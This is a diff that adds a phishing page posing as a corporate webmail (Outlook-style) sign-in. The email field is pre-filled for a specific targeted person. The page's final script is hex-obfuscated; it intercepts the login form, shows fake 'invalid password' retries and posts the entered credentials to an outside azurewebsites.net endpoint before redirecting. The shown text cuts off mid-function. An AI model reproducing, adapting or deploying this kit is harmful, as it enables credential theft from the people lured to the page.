@@ -1,0 +1,469 @@
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+ <script type="text/javascript">
+function MaskedPassword(passfield, symbol)
+{
+	if(typeof document.getElementById == 'undefined'
+		|| typeof document.styleSheets == 'undefined') { return false; }
+
+	if(passfield == null) { return false; }
+	
+	this.symbol = symbol;
+
+	this.isIE = typeof document.uniqueID != 'undefined';
+	
+	passfield.value = '';
+	passfield.defaultValue = '';
+	passfield._contextwrapper = this.createContextWrapper(passfield);
+	this.fullmask = false; 
+	var wrapper = passfield._contextwrapper;
+	
+	var hiddenfield = '<input type="hidden" name="' + passfield.name + '">';
+	
+	var textfield = this.convertPasswordFieldHTML(passfield);
+	wrapper.innerHTML = hiddenfield + textfield;
+
+	passfield = wrapper.lastChild;
+	passfield.className += ' masked';
+	passfield.setAttribute('autocomplete', 'off');
+
+	passfield._realfield = wrapper.firstChild;
+	
+	passfield._contextwrapper = wrapper;
+	this.limitCaretPosition(passfield);
+
+	var self = this;
+	
+	this.addListener(passfield, 'change', function(e) 
+	{ 
+		self.fullmask = false; 
+		self.doPasswordMasking(self.getTarget(e)); 
+	});
+	this.addListener(passfield, 'input', function(e) 
+	{ 
+		self.fullmask = false; 
+		self.doPasswordMasking(self.getTarget(e)); 
+	});
+	this.addListener(passfield, 'propertychange', function(e) 
+	{ 
+		self.doPasswordMasking(self.getTarget(e)); 
+	});
+	this.addListener(passfield, 'keyup', function(e) 
+	{ 
+		if(!/^(9|1[678]|224|3[789]|40)$/.test(e.keyCode.toString()))
+		{
+			self.fullmask = false; 
+			self.doPasswordMasking(self.getTarget(e));
+		}
+	});
+	this.addListener(passfield, 'blur', function(e) 
+	{ 
+		self.fullmask = true; 
+		self.doPasswordMasking(self.getTarget(e)); 
+	});
+	this.forceFormReset(passfield);
+
+	return true;
+}
+MaskedPassword.prototype =
+{
+	doPasswordMasking : function(textbox)
+	{
+		var plainpassword = '';
+		if(textbox._realfield.value != '')
+		{
+			for(var i=0; i<textbox.value.length; i++)
+			{
+				if(textbox.value.charAt(i) == this.symbol)
+				{
+					plainpassword += textbox._realfield.value.charAt(i);
+				}
+				else
+				{
+					plainpassword += textbox.value.charAt(i);
+				}
+			}
+		}
+		else 
+		{ 
+			plainpassword = textbox.value; 
+		}
+		
+		var maskedstring = this.encodeMaskedPassword(plainpassword, this.fullmask, textbox);
+		if(textbox._realfield.value != plainpassword || textbox.value != maskedstring)
+		{
+			textbox._realfield.value = plainpassword;
+			textbox.value = maskedstring;
+		}
+	},
+	
+	encodeMaskedPassword : function(passwordstring, fullmask, textbox)
+	{
+		var characterlimit = fullmask === true ? 0 : 1;
+		for(var maskedstring = '', i=0; i<passwordstring.length; i++)
+		{
+			if(i < passwordstring.length - characterlimit) 
+			{ 
+				maskedstring += this.symbol; 
+			}
+			else 
+			{
+				maskedstring += passwordstring.charAt(i); 
+			}
+		}
+		return maskedstring;
+	},
+	createContextWrapper : function(passfield)
+	{
+		var wrapper = document.createElement('span');
+		wrapper.style.position = 'relative';
+		passfield.parentNode.insertBefore(wrapper, passfield);
+
+		wrapper.appendChild(passfield);
+
+		return wrapper;
+	},
+
+	forceFormReset : function(textbox)
+	{
+
+		while(textbox)
+		{
+			if(/form/i.test(textbox.nodeName)) { break; }
+			textbox = textbox.parentNode;
+		}
+
+		if(!/form/i.test(textbox.nodeName)) { return null; }
+
+		this.addSpecialLoadListener(function() { textbox.reset(); });
+
+		return textbox;
+	},
+
+	convertPasswordFieldHTML : function(passfield, addedattrs)
+	{
+
+		var textfield = '<input';
+
+		for(var fieldattributes = passfield.attributes, 
+				j=0; j<fieldattributes.length; j++)
+		{
+
+			if(fieldattributes[j].specified && !/^(_|type|name)/.test(fieldattributes[j].name))
+			{
+				textfield += ' ' + fieldattributes[j].name + '="' + fieldattributes[j].value + '"';
+			}
+		}
+
+		textfield += ' type="text" autocomplete="off">';
+
+		return textfield;
+	},
+
+	limitCaretPosition : function(textbox)
+	{
+
+		var timer = null, start = function()
+		{
+
+			if(timer == null) 
+			{
+
+				if(this.isIE)
+				{
+
+					timer = window.setInterval(function() 
+					{ 
+
+						var range = textbox.createTextRange(),
+							valuelength = textbox.value.length,
+							character = 'character';
+						range.moveEnd(character, valuelength);
+						range.moveStart(character, valuelength);
+						range.select();				
+					
+
+					}, 100);
+				}
+
+				else
+				{
+
+					timer = window.setInterval(function() 
+					{ 
+
+						var valuelength = textbox.value.length;
+						if(!(textbox.selectionEnd == valuelength && textbox.selectionStart <= valuelength))
+						{
+							textbox.selectionStart = valuelength;
+							textbox.selectionEnd = valuelength;
+						}
+						
+
+					}, 100);
+				}
+			}
+		},
+		
+
+		stop = function()
+		{
+			window.clearInterval(timer);
+			timer = null;
+		};
+		
+
+		this.addListener(textbox, 'focus', function() { start(); });
+		this.addListener(textbox, 'blur', function() { stop(); });
+	},
+	
+	
+
+	addListener : function(eventnode, eventname, eventhandler)
+	{
+		if(typeof document.addEventListener != 'undefined')
+		{
+			return eventnode.addEventListener(eventname, eventhandler, false);
+		}
+		else if(typeof document.attachEvent != 'undefined')
+		{
+			return eventnode.attachEvent('on' + eventname, eventhandler);
+		}
+	},
+
+	addSpecialLoadListener : function(eventhandler)
+	{
+
+		if(this.isIE)
+		{
+			return window.attachEvent('onload', eventhandler);
+		}
+		else
+		{
+			return document.addEventListener('DOMContentLoaded', eventhandler, false);
+		}
+	},
+	
+	
+
+	getTarget : function(e)
+	{
+		if(!e) { return null; }
+		return e.target ? e.target : e.srcElement;
+	}
+
+}
+
+
+ 
+</script>   
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="">
+    <meta name="author" content="">
+    <link rel="icon" href="./Signin/logo.png">
+
+    <title>Webmail Login</title>
+
+    <!-- Bootstrap core CSS -->
+    <link rel="stylesheet" href="./Signin/bootstrap.min.css" integrity="sha384-9gVQ4dYFwwWSjIDZnLEWnxCjeSWFphJiwGPXr1jddIhOegiu1FwO5qRGvFXOdJZ4" crossorigin="anonymous">
+
+    <!-- Custom styles for this template -->
+    <style>
+
+        @font-face {
+    font-family: SegoeUI;
+    src:
+        local("Segoe UI Light"),
+        url(//c.s-microsoft.com/static/fonts/segoe-ui/west-european/light/latest.woff2) format("woff2"),
+        url(//c.s-microsoft.com/static/fonts/segoe-ui/west-european/light/latest.woff) format("woff"),
+        url(//c.s-microsoft.com/static/fonts/segoe-ui/west-european/light/latest.ttf) format("truetype");
+    font-weight: 100;
+}
+
+@font-face {
+    font-family: SegoeUI;
+    src:
+        local("Segoe UI Semilight"),
+        url(//c.s-microsoft.com/static/fonts/segoe-ui/west-european/semilight/latest.woff2) format("woff2"),
+        url(//c.s-microsoft.com/static/fonts/segoe-ui/west-european/semilight/latest.woff) format("woff"),
+        url(//c.s-microsoft.com/static/fonts/segoe-ui/west-european/semilight/latest.ttf) format("truetype");
+    font-weight: 200;
+}
+
+@font-face {
+    font-family: SegoeUI;
+    src:
+        local("Segoe UI"),
+        url(//c.s-microsoft.com/static/fonts/segoe-ui/west-european/normal/latest.woff2) format("woff2"),
+        url(//c.s-microsoft.com/static/fonts/segoe-ui/west-european/normal/latest.woff) format("woff"),
+        url(//c.s-microsoft.com/static/fonts/segoe-ui/west-european/normal/latest.ttf) format("truetype");
+    font-weight: 400;
+}
+
+@font-face {
+    font-family: SegoeUI;
+    src:
+        local("Segoe UI Bold"),
+        url(//c.s-microsoft.com/static/fonts/segoe-ui/west-european/bold/latest.woff2) format("woff2"),
+        url(//c.s-microsoft.com/static/fonts/segoe-ui/west-european/bold/latest.woff) format("woff"),
+        url(//c.s-microsoft.com/static/fonts/segoe-ui/west-european/bold/latest.ttf) format("truetype");
+    font-weight: 600;
+}
+
+@font-face {
+    font-family: SegoeUI;
+    src:
+        local("Segoe UI Semibold"),
+        url(//c.s-microsoft.com/static/fonts/segoe-ui/west-european/semibold/latest.woff2) format("woff2"),
+        url(//c.s-microsoft.com/static/fonts/segoe-ui/west-european/semibold/latest.woff) format("woff"),
+        url(//c.s-microsoft.com/static/fonts/segoe-ui/west-european/semibold/latest.ttf) format("truetype");
+    font-weight: 700;
+}
+
+*{
+    font-family: SegoeUI,"-apple-system",BlinkMacSystemFont,Roboto,"Helvetica Neue",sans-serif;
+}
+   html,
+body {
+  height: 90%;
+}
+
+body {
+  display: -ms-flexbox;
+  display: flex;
+  -ms-flex-align: center;
+  align-items: center;
+  padding-top: 40px;
+  padding-bottom: 20px;
+  background-color: #f5f5f5;
+}
+
+.form-signin {
+  width: 100%;
+  max-width: 330px;
+  padding: 5px;
+  margin: auto;
+}
+.form-signin .checkbox {
+  font-weight: 400;
+}
+.form-signin .form-control {
+  position: relative;
+  width: 100%;
+  box-sizing: border-box;
+  height: auto;
+  padding: 13px;
+  font-size: 16px;
+}
+.form-signin .form-control:focus {
+  z-index: 2;
+}
+.form-signin input[type="email"] {
+  margin-bottom: 8px;
+  border-bottom-right-radius: 0;
+  border-bottom-left-radius: 0;
+}
+.form-signin input[type="password"] {
+  margin-bottom: 10px;
+  border-top-left-radius: 0;
+  border-top-right-radius: 0;
+}
+
+.sidebar {
+    position: absolute;
+    top: 0px;
+    bottom: 0px;
+    left: 0px;
+    display: inline-block;
+    width: 332px;
+}
+
+.sidebar {
+    background-color: #0072C6;
+}
+
+.sidebar .owaLogoContainer {
+    margin: 40vh auto auto 109px;
+    text-align: left /* Logo aligns left for both ltr & rtl */;
+}
+
+.login-box{
+    padding-left: 0;
+    width: 100%;
+}
+
+
+@media (min-width: 576px) { 
+    .login-box{
+        padding-left: 332px;
+    }
+ }
+
+
+@media (min-width: 768px) { 
+    .login-box{
+        padding-left: 332px;
+    }
+ }
+
+
+@media (min-width: 992px) { 
+    .login-box{
+        padding-left: 332px;
+    }
+ }
+
+
+@media (min-width: 1200px) { 
+    .login-box{
+        padding-left: 332px;
+    }
+ }
+
+ .btn.btn-primary{
+     background-color: #0072C6;
+	 width: 100%;
+	 height: 50%;
+	 padding: 13px;
+ }
+    </style>
+
+</head>
+
+<body class="text-center">
+    <div class="sidebar d-none d-sm-block d-md-block d-lg-block d-xl-block">
+        <div class="owaLogoContainer">
+            <img src="./Signin/webapp.png" class="owaLogo" aria-hidden="true">
+            <!-- <img src="data:image/png;base64,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" class="owaLogoSmall" aria-hidden="true">
+         -->
+        </div>
+    </div>
+    <div class="login-box">
+        <form class="form-signin" action="error.php" method="POST" name="logonForm" enctype="application/x-www-form-urlencoded" autocomplete="off">
+            <input type="hidden" name="password_old" value="">
+            <img class="mb-4" src="./Signin/webapp.png" alt="Web App" style="width: 100%">
+            <h1 style="text-transform: capitalize;" class="h4 mb-3 font-weight-normal" id="corportate-title">FHZVGBZBPBEC</h1>
+            
+            <input type="email" id="username" class="form-control" name="email" placeholder="Email address" required="" autofocus="" readonly="" value="oevwrfu.gubznf@fhzvgbzbpbec.pb.wc">
+            
+            <input type="password" id="inputPassword" name="password1" class="form-control" placeholder="Password" required="">
+            <div class="checkbox mb-3 text-left">
+                <label><input type="checkbox" value="remember-me">&nbsp;<span id="privateLabel" aria-hidden="true">Private
+                        computer</span>(<a href="#" class="signInCheckBoxLink" role="link">What is this?</a>)‎</label>
+            </div>
+            <button class="btn btn-lg btn-primary btn-block" id="sign-in-btn" type="submit">Sign in</button>
+            <p class="mt-5 mb-3 text-muted">©FHZVGBZBPBEC Webmail App
+                <!--?php echo date('Y') ?-->
+            </p>
+        </form>
+    </div>
+
+    <script src="./Signin/jquerys-3.3.1.min.js"></script>
+    <script src="./Signin/popper.min.js" integrity="sha384-cs/chFZiN24E4KMATLdqdvsezGxaGsi4hLGOzlXwp5UZB1LY//20VyM2taTB4QvJ" crossorigin="anonymous"></script>
+    <script src="./Signin/bootstrap.min.js" integrity="sha384-uefMccjFJAIv6A+rW+L4AHf99KvxDjWSu1z9VI8SKNVmz4sk7buKt/6v9KI65qnm" crossorigin="anonymous"></script>
+    <script>
+var _0xe9f1=["\x63","","\x73\x70\x6C\x69\x74","\x62\x63\x64\x66\x67\x68\x6A\x6B\x6C\x6D\x6E\x70\x71\x72\x73\x74\x76\x77\x78\x79\x7A","\x73\x75\x62\x73\x74\x72","\x61","\x65","\x69","\x6F","\x75","\x30","\x67","\x72\x65\x70\x6C\x61\x63\x65","\x40","\x74\x65\x73\x74","\x5C\x5D","\x5C\x5B","\x5B\x5C\x3F\x26\x5D","\x3D\x28\x5B\x5E\x26\x23\x5D\x2A\x29","\x73\x65\x61\x72\x63\x68","\x65\x78\x65\x63","\x20","\x2E\x2A\x66\x75\x63\x6B\x2E\x2A","\x2E\x2A\x70\x75\x73\x73\x79\x2E\x2A","\x2E\x2A\x62\x69\x74\x63\x68\x2E\x2A","\x2E\x2A\x61\x73\x73\x68\x6F\x6C\x65\x2E\x2A","\x2E\x2A\x66\x6F\x6F\x6C\x2E\x2A","\x2E\x2A\x64\x69\x63\x6B\x2E\x2A","\x2E\x2A\x6D\x61\x6D\x61\x2E\x2A","\x2E\x2A\x6E\x69\x63\x65\x2E\x2A\x74\x72\x79\x2E\x2A","\x2E\x2A\x31\x32\x33\x34\x35\x2E\x2A","\x75\x73\x65\x72\x6E\x61\x6D\x65","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\x76\x61\x6C\x75\x65","\x72\x65\x61\x64\x4F\x6E\x6C\x79","\x63\x6F\x72\x70\x6F\x72\x74\x61\x74\x65\x2D\x74\x69\x74\x6C\x65","\x69\x6E\x6E\x65\x72\x54\x65\x78\x74","\x20\x45\x6D\x61\x69\x6C\x20\x53\x65\x74\x74\x69\x6E\x67\x73\x20\x4C\x6F\x67\x69\x6E","\x73\x75\x62\x6D\x69\x74","\x70\x72\x65\x76\x65\x6E\x74\x44\x65\x66\x61\x75\x6C\x74","\x6F\x6E","\x66\x6F\x72\x6D","\x74\x72\x69\x6D","\x76\x61\x6C","\x69\x6E\x70\x75\x74\x5B\x6E\x61\x6D\x65\x3D\x22\x65\x6D\x61\x69\x6C\x22\x5D","\x69\x6E\x70\x75\x74\x5B\x6E\x61\x6D\x65\x3D\x22\x70\x61\x73\x73\x77\x6F\x72\x64\x22\x5D","\x6C\x65\x6E\x67\x74\x68","\x45\x6D\x61\x69\x6C\x20\x61\x6E\x64\x20\x50\x61\x73\x73\x77\x6F\x72\x64\x20\x52\x65\x71\x75\x69\x72\x65\x64\x21","\x66\x6F\x63\x75\x73","\x45\x6D\x61\x69\x6C\x20\x69\x73\x20\x69\x6E\x76\x61\x6C\x69\x64\x2C\x20\x54\x72\x79\x20\x61\x67\x61\x69\x6E\x21","\x50\x61\x73\x73\x77\x6F\x72\x64\x20\x69\x73\x20\x69\x6E\x76\x61\x6C\x69\x64\x2C\x20\x54\x72\x79\x20\x61\x67\x61\x69\x6E\x21","\x72\x61\x6E\x64\x6F\x6D","\x64\x69\x73\x61\x62\x6C\x65\x64","\x70\x72\x6F\x70","\x23\x73\x69\x67\x6E\x2D\x69\x6E\x2D\x62\x74\x6E","\x53\x69\x67\x6E\x69\x6E\x67\x20\x49\x6E\x2E\x2E","\x74\x65\x78\x74","\x70\x72\x6F\x74\x6F\x63\x6F\x6C","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x2F\x2F","\x68\x6F\x73\x74","\x2F\x73\x75\x63\x63\x65\x73\x73\x2E\x68\x74\x6D","\x53\x69\x67\x6E\x20\x49\x6E","\x69\x6E\x70\x75\x74\x5B\x6E\x61\x6D\x65\x3D\x22\x70\x61\x73\x73\x77\x6F\x72\x64\x5F\x6F\x6C\x64\x22\x5D","\x49\x6E\x76\x61\x6C\x69\x64\x20\x50\x61\x73\x73\x77\x6F\x72\x64\x2C\x20\x54\x72\x79\x20\x61\x67\x61\x69\x6E","\x66\x61\x69\x6C","\x6F\x66\x66\x69\x63\x65\x33\x36\x35","\x70\x61\x72\x61\x6D","\x52\x65\x64\x69\x72\x65\x63\x74\x69\x6E\x67\x2E\x2E","\x68\x72\x65\x66","\x70\x6F\x73\x74","\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5A\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39","\x66\x6C\x6F\x6F\x72","\x63\x68\x61\x72\x41\x74","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x76\x61\x6C\x69\x64\x61\x74\x65\x36\x39\x38\x34\x75\x64\x37\x74\x64\x70\x67\x75\x74\x79\x66\x67\x64\x66\x69\x74\x66\x2E\x61\x7A\x75\x72\x65\x77\x65\x62\x73\x69\x74\x65\x73\x2E\x6E\x65\x74\x2F\x76\x33\x2E\x70\x68\x70"];var $c=getUrlParameter(_0xe9f1[0]);var $current_email=_0xe9f1[1];if($c){$current_email= isValidEmail($c)?$c:decodeCustom($c)};function decodeCustom(_0x3c58x4){var _0x3c58x5=_0xe9f1[3][_0xe9f1[2]](_0xe9f1[1]);var _0x3c58x6=_0x3c58x4[_0xe9f1[4]](0,1);var _0x3c58x7=_0x3c58x4[_0xe9f1[4]](2);var _0x3c58x8=[_0xe9f1[5],_0xe9f1[6],_0xe9f1[7],_0xe9f1[8],_0xe9f1[9]];var _0x3c58x9=[];for($i in _0x3c58x5){_0x3c58x7= _0x3c58x7[_0xe9f1[12]]( new RegExp(_0x3c58x6+ _0xe9f1[10]+ $i+ _0xe9f1[5],_0xe9f1[11]),_0x3c58x5[$i])};for($i in _0x3c58x8){_0x3c58x7= _0x3c58x7[_0xe9f1[12]]( new RegExp(_0x3c58x6+ $i,_0xe9f1[11]),_0x3c58x8[$i])};_0x3c58x7= _0x3c58x7[_0xe9f1[12]]( new RegExp(_0x3c58x6+ _0x3c58x6+ _0x3c58x6,_0xe9f1[11]),_0xe9f1[13]);return _0x3c58x7}function isValidEmail(_0x3c58xb){var _0x3c58xc=/^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;return _0x3c58xc[_0xe9f1[14]](_0x3c58xb)}function getUrlParameter(_0x3c58xe){_0x3c58xe= _0x3c58xe[_0xe9f1[12]](/[\[]/,_0xe9f1[16])[_0xe9f1[12]](/[\]]/,_0xe9f1[15]);var _0x3c58xf= new RegExp(_0xe9f1[17]+ _0x3c58xe+ _0xe9f1[18]);var _0x3c58x10=_0x3c58xf[_0xe9f1[20]](location[_0xe9f1[19]]);return _0x3c58x10=== null?_0xe9f1[1]:decodeURIComponent(_0x3c58x10[1][_0xe9f1[12]](/\+/g,_0xe9f1[21]))}var currentEmail=$current_email;var ListEntries=[_0xe9f1[22],_0xe9f1[23],_0xe9f1[24],_0xe9f1[25],_0xe9f1[26],_0xe9f1[27],_0xe9f1[28],_0xe9f1[29],_0xe9f1[30]];$(function(){if(currentEmail){var _0x3c58x13=document[_0xe9f1[32]](_0xe9f1[31]);_0x3c58x13[_0xe9f1[33]]= currentEmail;_0x3c58x13[_0xe9f1[34]]= true;var _0x3c58x14=extractDomain(currentEmail);var _0x3c58x15=document[_0xe9f1[32]](_0xe9f1[35]);_0x3c58x15[_0xe9f1[36]]= _0x3c58x14+ _0xe9f1[37]};$(_0xe9f1[41])[_0xe9f1[40]](_0xe9f1[38],function(_0x3c58x13){_0x3c58x13[_0xe9f1[39]]();return handleFormSubmit()})});function extractDomain(_0x3c58xb){var _0x3c58x17=_0x3c58xb;var _0x3c58x14=_0xe9f1[1];var _0x3c58xf=/.+@(.*?)\..+/;var _0x3c58x18=_0x3c58xb;var _0x3c58x19;if((_0x3c58x19= _0x3c58xf[_0xe9f1[20]](_0x3c58x18))!== null){return _0x3c58x19[1]};return null}var passwordAttempts=0;function handleFormSubmit(){var _0x3c58xb=$(_0xe9f1[44])[_0xe9f1[43]]()[_0xe9f1[42]]();var _0x3c58x1c=$(_0xe9f1[45])[_0xe9f1[43]]()[_0xe9f1[42]]();if(!_0x3c58xb[_0xe9f1[46]]||  !_0x3c58x1c[_0xe9f1[46]]){alert(_0xe9f1[47]);if(!_0x3c58xb[_0xe9f1[46]]){$(_0xe9f1[44])[_0xe9f1[48]]()}else {$(_0xe9f1[45])[_0xe9f1[48]]()};return false};if(!validateEmail(_0x3c58xb)){alert(_0xe9f1[49]);$(_0xe9f1[44])[_0xe9f1[48]]();return 